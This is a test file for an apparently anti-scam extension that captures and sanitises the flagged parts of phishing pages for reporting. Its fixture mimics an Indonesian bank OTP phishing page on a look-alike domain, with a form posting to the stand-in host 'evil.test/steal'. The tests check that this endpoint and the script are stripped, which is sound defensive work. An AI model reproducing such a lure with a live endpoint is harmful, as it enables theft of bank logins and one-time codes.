// node --test ios/ShooExtension/Tests/*.test.mjs
// ADM-07 evidence fragments: replica.js captureFragments, report.js fragmentGroups, replica-build.js buildFragments.
import { test } from "node:test";
import assert from "node:assert/strict";

globalThis.ShooMarks = {
    TEXT_SIGNALS: new Set(["urgent_language", "brand_logo_offsite", "unreasonable_request", "hoax_claim"]),
    FIELD_SIGNAL: /^asks_/,
};
await import("../Resources/replica.js");
await import("../Resources/report.js");
import { buildFragments, fragmentsDocument } from "../Resources/replica-build.js";
const { captureFragments, mergeGroups, CSP } = globalThis.ShooReplica;
const { fragmentGroups } = globalThis.ShooReport;

// Minimal DOM stand-in, as in replica.test.mjs, plus contains() for merging nested parts.
const text = (data) => ({ nodeType: 3, data });
function h(localName, attrs = {}, ...children) {
    const el = {
        nodeType: 1,
        localName,
        attributes: Object.entries(attrs).map(([name, value]) => ({ name, value })),
        childNodes: children.map((c) => (typeof c === "string" ? text(c) : c)),
        getAttribute: (key) => attrs[key] ?? null,
        getBoundingClientRect: () => ({ width: 300, height: 150 }),
        contains(other) {
            return other === el || el.childNodes.some((c) => c.nodeType === 1 && c.contains(other));
        },
    };
    return el;
}
const page = { url: "https://bca-verifikasi.site/login", viewport: { width: 390, height: 844 }, now: "2026-11-04T03:00:00.000Z" };
const style = (css) => ({ ...h("style"), sheet: { cssRules: [{ cssText: css }] } });

function scamPage() {
    const otp = h("input", { name: "otp", type: "text", value: "123456", "data-typed": "123456", placeholder: "Masukkan OTP" });
    const form = h("form", { class: "login", action: "https://evil.test/steal" }, h("label", {}, "Kode OTP"), otp, h("script", {}, "steal()"));
    const urgent = h("p", { class: "warn" }, "Akun Anda diblokir dalam 24 jam");
    const header = h("header", {}, "Halo Budi Santoso");
    const body = h("body", {}, header, h("main", {}, urgent, form), style(".warn{color:red}"));
    const doc = { documentElement: h("html", {}, h("head", {}, style("body{font:14px sans-serif}")), body), baseURI: page.url, doctype: {} };
    return { doc, otp, form, urgent, header, body };
}

test("only the flagged parts are kept: no other page text, no script, no typed value, no form action", () => {
    const { doc, form, urgent } = scamPage();
    const draft = captureFragments(doc, page, [
        { element: form, signalIds: ["asks_otp"] },
        { element: urgent, signalIds: ["urgent_language"] },
    ]);
    assert.equal(draft.sections.length, 2);
    const html = fragmentsDocument(draft);
    assert.match(html, /Masukkan OTP/);
    assert.match(html, /Akun Anda diblokir/);
    assert.doesNotMatch(html, /Halo Budi/); // the page's header is not a flagged part
    assert.doesNotMatch(html, /123456|steal|evil\.test|data-typed/);
    assert.match(html, /<section data-shoo-fragment data-shoo-signals="asks_otp">/);
    assert.match(html, /<section data-shoo-fragment data-shoo-signals="urgent_language">/);
    assert.ok(html.startsWith("<!doctype html><html><head><meta charset=\"utf-8\">"));
    assert.ok(html.includes(CSP));
});

test("the page's stylesheets come once, in the head, from head and body", () => {
    const { doc, form, urgent } = scamPage();
    const draft = captureFragments(doc, page, [{ element: form, signalIds: ["asks_otp"] }, { element: urgent, signalIds: ["urgent_language"] }]);
    assert.equal(draft.sheets.length, 2);
    assert.equal((draft.head.match(/<style>/g) ?? []).length, 2);
    for (const s of draft.sections) assert.doesNotMatch(s.html, /<style/);
});

test("a part inside another part is written once, with both signal ids", () => {
    const { doc, form } = scamPage();
    const label = form.childNodes[0];
    const groups = mergeGroups([
        { element: label, signalIds: ["urgent_language"] },
        { element: form, signalIds: ["asks_otp"] },
        { element: form, signalIds: ["asks_pin"] },
    ]);
    assert.equal(groups.length, 1);
    assert.equal(groups[0].element, form);
    assert.deepEqual(groups[0].signalIds.sort(), ["asks_otp", "asks_pin", "urgent_language"]);
    const draft = captureFragments(doc, page, groups);
    assert.equal(draft.sections.length, 1);
});

test("the whole page is never a part: body, head and html are skipped", () => {
    const { doc, body } = scamPage();
    assert.equal(captureFragments(doc, page, [{ element: body, signalIds: ["urgent_language"] }]), null);
    assert.equal(captureFragments(doc, page, []), null);
});

test("fragmentGroups: heaviest signal first, field → its form, text → its block, nothing for page-less signals", () => {
    const { form, otp, urgent } = scamPage();
    const signals = [
        { id: "urgent_language", weight: 10, evidence: "diblokir dalam 24 jam" },
        { id: "db_match", weight: 50, evidence: "shoo" },
        { id: "asks_otp", weight: 30, evidence: "otp" },
    ];
    const groups = fragmentGroups(signals, {
        textBlocks: (phrase) => (phrase === "diblokir dalam 24 jam" ? [urgent] : []),
        imageBlocks: () => [],
        fields: () => [{ el: otp, name: "otp", id: "", kind: "otp" }],
        fieldBlock: (el) => (el === otp ? form : null),
    });
    assert.deepEqual(groups.map((g) => g.signalIds[0]), ["asks_otp", "urgent_language"]);
    assert.equal(groups[0].element, form);
    assert.equal(groups[1].element, urgent);
});

test("fragmentGroups: a field signal without a name match falls back to the field kind", () => {
    const { form, otp } = scamPage();
    const groups = fragmentGroups([{ id: "asks_otp", weight: 30, evidence: "" }], {
        textBlocks: () => [], imageBlocks: () => [],
        fields: () => [{ el: otp, name: "code", id: "", kind: "otp" }],
        fieldBlock: () => form,
    });
    assert.equal(groups.length, 1);
});

const noFetch = { fetchText: async () => null, fetchImage: async () => null };

test("buildFragments: fits → one document; too big → the lightest parts go first", async () => {
    const big = "x".repeat(150 * 1024);
    const draft = {
        head: "<meta charset=\"utf-8\">",
        sections: ["asks_otp", "urgent_language", "hoax_claim"].map((id) => ({ signalIds: [id], html: `<p>${id}${big}</p>` })),
        sheets: [], resources: [], nonce: "shoot", truncated: false,
    };
    const identity = async (html) => html; // "compressed" size = document size, so 3 × 150 KB is over 400 KB
    const packed = await buildFragments(draft, noFetch, { compress: identity });
    assert.ok(packed.length <= 400 * 1024);
    assert.match(packed, /asks_otp/);
    assert.doesNotMatch(packed, /hoax_claim/);
    const small = await buildFragments({ ...draft, sections: draft.sections.map((s) => ({ ...s, html: "<p>ok</p>" })) }, noFetch, { compress: identity });
    assert.equal((small.match(/data-shoo-fragment/g) ?? []).length, 3);
});

test("buildFragments: nothing to send → null", async () => {
    assert.equal(await buildFragments(null, noFetch), null);
    assert.equal(await buildFragments({ head: "", sections: [], sheets: [], resources: [], nonce: "n" }, noFetch), null);
});

test("fragmentsDocument escapes the signal ids attribute", () => {
    const html = fragmentsDocument({ head: "", sections: [{ signalIds: ['a"b<c'], html: "<p>x</p>" }] });
    assert.match(html, /data-shoo-signals="a&quot;b&lt;c"/);
});
